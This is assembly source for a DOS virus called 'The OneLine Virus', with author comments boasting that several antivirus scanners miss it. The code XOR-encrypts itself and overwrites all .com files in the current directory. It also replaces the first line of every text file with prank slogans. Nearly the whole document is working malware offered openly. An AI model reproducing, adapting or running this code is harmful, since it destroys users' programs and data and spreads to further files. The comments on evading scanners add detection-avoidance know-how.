
; ------------------------------------------------------------
; --                    The OneLine Virus                   --
; --               By Arsonic[CodeBreakers]                 --
; --          HTTP://CODEBREAKERS.SIMPLENET.COM             --
; ------------------------------------------------------------


; Virus Info: This Virus is a 600 byte Long Encrypted Overwriting piece of
; shit. it will infect all *.com file in the current directory and overwrite
; the first line of all text files found with Famous Lines And Stuff..

; Detected By:

; TBAV:  Says This is a Unknown Virus.. But Only on the First Generation.. :)
; FPROT: ??? did'n have it on my computer at the time of scanning.. 
; AVP:   Nope.. Detected 3000 other virus's i got on my comp.. but not this one..

jmp crypt_start

start:
mov di,si
mov cx,crypt_start
call crypt
jmp crypt_start

crypt:
xorloop:
lodsb
xor al,byte ptr[xor_value]
stosb
loop xorloop
ret

xor_value db 0

crypt_start:

mov ah,4eh
lea dx,mask
int 21h
jnc infect
jmp text

infect:
mov ax,3d02h
mov dx,9eh
int 21h
mov bx,ax

; I suggest 'xchg bx,ax', because its only 1 byte, but thats your decision

in al,40h
mov byte ptr [xor_value],al

lea si,crypt_start
lea di,end
mov cx,end - crypt_start
call crypt

mov ah,40h
mov cx,crypt_start - start
lea dx,start
int 21h

mov ah,40h
mov cx,end - crypt_start
lea dx,end
int 21h

mov ah,3eh
int 21h
jmp find_next

find_next:
mov ah,3fh
int 21h
jnc infect
jmp text

text:
mov ah,4eh
lea dx,textmask
int 21h
jnc text_payload
jmp close

text_payload:
mov ax,3d02h
mov dx,9eh
int 21h

mov ah,40h
mov cx,message_end - message_start
lea dx,message_start
int 21h

mov ah,3fh
int 21h
jmp text_findnext

text_findnext:
mov ah,4fh
int 21h
jnc text_payload
jmp close

message_start:
db 'LEGALIZE CANNABUS!'
db 'HO HO HO.. NOW I HAVE A MACHINE GUN!'
db 'This is another 60 minutes...'
db 'Burn Baby, BURN!'
db 'Keep The Opressor Opressing..'
db 'Have U Had Your Break TodaY?'
db 'Oh I Wish I Was A Ocsar Myer Wiener!'
db 'What Came First The Chicken Or the Egg?'
db 'Help Me.. Help You!'
db 'SHOW ME THE MONEY!!'
db 'Take it Off Baby!'
db 'ADRIAN!!!!'
db 'Where do You Want To Go Today?'
db 'We Are the Shitty VR! VRLAND SUX SHIT!'
db 'INCOMING!!!!!!!! BOOOOOOOOOMMMMMM!'
message_end:

close:
int 20h

mask db '*.com',0
textmask db '*.txt',0
author db ' ARSONIC [CODEBREaKERS]',13,10,'$'
virus db 'THE OnELINE VIRUS',13,10,'$'
origin db 'PROUDLY MADE IN CANADA..',13,10,'$'
end:
